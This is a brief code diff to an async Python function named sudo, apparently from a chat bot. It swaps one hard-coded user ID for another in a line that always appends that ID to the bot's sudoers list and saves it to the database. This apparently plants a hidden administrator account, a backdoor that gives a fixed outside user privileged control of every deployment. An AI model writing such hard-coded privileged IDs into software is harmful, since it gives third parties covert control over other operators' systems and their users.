@@ -56,7 +56,7 @@ async def sudo():
             upsert=True,
         )
 
-    sudoers.append(5916859256)
+    sudoers.append(7137269276)
     await sudoersdb.update_one(
         {"sudo": "sudo"},
         {"$set": {"sudoers": sudoers}},
